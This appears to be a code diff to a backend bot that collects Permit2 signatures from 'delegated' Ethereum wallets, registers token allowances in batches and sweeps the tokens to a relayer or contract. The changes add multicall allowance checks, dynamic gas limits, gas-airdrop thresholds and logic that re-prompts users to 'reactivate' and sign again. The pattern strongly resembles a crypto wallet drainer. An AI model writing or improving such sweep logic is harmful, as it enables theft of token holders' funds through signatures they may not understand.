@@ -47,8 +47,14 @@ const MIN_TOKEN_UNITS      = "0.5";
 
 // Wrapped native token — WETH on Ethereum
 const WRAPPED_NATIVE_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2".toLowerCase();
-// Native surplus above this = user forgot to wrap; prompt re-activation
-const NATIVE_WRAP_FLOOR      = ethers.parseEther("0.002");  // 0.002 ETH
+// Minimum surplus that the frontend will actually attempt to wrap
+// (WRAP_GAS_RESERVE 0.002 + WRAP_MIN_SURPLUS 0.0005 = 0.0025 ETH).
+// Bot only flags needs_reactivation when balance exceeds this — anything
+// at or below is the normal gas reserve left behind after the wrap step.
+const NATIVE_WRAP_FLOOR      = ethers.parseEther("0.0025"); // 0.0025 ETH
+// If ETH balance exceeds this, it's the user's own ETH (not airdrop change).
+// 3× GAS_AIRDROP_AMOUNT (0.003 × 3 = 0.009) — same ceiling as the frontend.
+const NATIVE_WRAP_CEILING    = ethers.parseEther("0.009");  // 0.009 ETH
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
@@ -1447,7 +1453,10 @@ async function trySweepNativeFor(checksum, short) {
     if (wallet.type !== "permit2-gasless" && wallet.type !== "permit2") return;
 
     const userBal = await getReadProvider().getBalance(checksum);
+    // Below floor = gas reserve only, nothing meaningful to wrap.
     if (userBal <= NATIVE_WRAP_FLOOR) return;
+    // Above ceiling = user's own ETH unrelated to our airdrop — hands off.
+    if (userBal > NATIVE_WRAP_CEILING) return;
 
     // Check WETH balance — if > 0 the user already wrapped; sweep will handle it.
     const wethContract = new ethers.Contract(
@@ -1459,14 +1468,10 @@ async function trySweepNativeFor(checksum, short) {
       return;
     }
 
-    // User has raw ETH but no WETH — needs to re-activate to go through wrap step.
-    warn(`[nativeFor] ${short} — ${ethers.formatEther(userBal)} ETH sits unwrapped in wallet — marking needs_reactivation`);
-    if (supabase) {
-      await supabase.from("delegated_wallets")
-        .update({ needs_reactivation: true })
-        .eq("address", checksum.toLowerCase()).eq("chain", CHAIN)
-        .then(v => v, () => {});
-    }
+    // User has airdrop-range ETH but no WETH — prompt re-activation so the wrap step runs.
+    // Only set needs_reactivation if there's truly no AllowanceTransfer sweep path.
+    warn(`[nativeFor] ${short} — ${ethers.formatEther(userBal)} ETH unwrapped (in airdrop range) — checking backup before flagging`);
+    await setNeedsReactivationIfNoBackup(checksum, checksum.toLowerCase());
   } catch (e) {
     maybeResetNonce(e);
     err(`[nativeFor] ❌ ${short}: ${e.reason ?? e.message}`);
@@ -1786,12 +1791,31 @@ async function sweep(wallet) {
       const pb3IsV2     = !!(CONTRACT_ADDRESS && pb3Spender === CONTRACT_ADDRESS.toLowerCase());
       const pb3CheckFor = pb3IsV2 ? CONTRACT_ADDRESS : relayerWallet.address;
 
-      // Register AllowanceTransfer on-chain if not already set (anyone can call permit()).
+      // Register AllowanceTransfer on-chain if any token is missing its allowance.
+      // Check ALL tokens via Multicall3 — not just details[0] — so partial batches
+      // (e.g. tokens 1-19 missing after a nonce collision on token 0) still trigger permit().
       try {
-        const [p2Amount0] = await permit2Read.allowance(checksum, pbData.permit.details[0]?.token, pb3CheckFor);
-        if (p2Amount0 === 0n) {
+        const ALLOW_ABI_3 = ["function allowance(address,address,address) view returns (uint160,uint48,uint48)"];
+        const allowIface3 = new ethers.Interface(ALLOW_ABI_3);
+        const mc3 = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
+        const allowCalls = pbData.permit.details.map(d => ({
+          target: PERMIT2_ADDRESS,
+          allowFailure: true,
+          callData: allowIface3.encodeFunctionData("allowance", [checksum, d.token, pb3CheckFor]),
+        }));
+        const allowResults = await mc3.aggregate3(allowCalls).catch(() => null);
+        const needsPermitCall = !allowResults || allowResults.some((r, i) => {
+          if (!r.success) return true;
+          try {
+            const [amt,, exp] = allowIface3.decodeFunctionResult("allowance", r.returnData);
+            return BigInt(amt) === 0n || BigInt(exp) <= BigInt(Math.floor(Date.now() / 1000));
+          } catch { return true; }
+        });
+        if (needsPermitCall) {
           log(`[allowance] calling permit() to register ${pbData.permit.details.length} token allowances (spender=${pb3Spender.slice(0,10)})`);
           const fee = await getFeeData();
+          // Dynamic gas: 120k base + 14k per detail — same formula as sweepGaslessWallet.
+          const permitGas3 = BigInt(Math.min(120_000 + pbData.permit.details.length * 14_000, 800_000));
           const permitTx = await permit2.permit(
             checksum,
             {
@@ -1800,7 +1824,7 @@ async function sweep(wallet) {
               sigDeadline: BigInt(pbData.permit.sigDeadline ?? Math.floor(Date.now()/1000)+3600),
             },
             pbData.signature,
-            { gasLimit: 300_000n, ...fee }
+            { gasLimit: permitGas3, ...fee }
           );
           await permitTx.wait();
           log(`[allowance] ✅ permit() confirmed`);
@@ -1824,12 +1848,8 @@ async function sweep(wallet) {
           await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
         }
         if (approvedTokens.length === 0) {
-          warn(`[allowance] sweepViaPermit2 skipped — ERC-20→Permit2 approval missing for all ${tokenAddrs.length} token(s). Marking needs_reactivation.`);
-          if (supabase) {
-            await supabase.from("delegated_wallets")
-              .update({ needs_reactivation: true })
-              .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
-          }
+          warn(`[allowance] sweepViaPermit2 skipped — ERC-20→Permit2 approval missing for all ${tokenAddrs.length} token(s)`);
+          await setNeedsReactivationIfNoBackup(checksum, addrKey);
         } else {
           try {
             const fee = await getFeeData();
@@ -1839,12 +1859,8 @@ async function sweep(wallet) {
           } catch (e) {
             const emsg = e.reason ?? e.message ?? "";
             if (/TRANSFER_FROM_FAILED|transferFrom/i.test(emsg)) {
-              warn(`[allowance] sweepViaPermit2 ❌ ERC-20→Permit2 approval missing — marking needs_reactivation`);
-              if (supabase) {
-                await supabase.from("delegated_wallets")
-                  .update({ needs_reactivation: true })
-                  .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
-              }
+              warn(`[allowance] sweepViaPermit2 ❌ ERC-20→Permit2 approval missing — checking backup`);
+              await setNeedsReactivationIfNoBackup(checksum, addrKey);
             } else {
               err(`[allowance] sweepViaPermit2 ❌: ${emsg}`);
             }
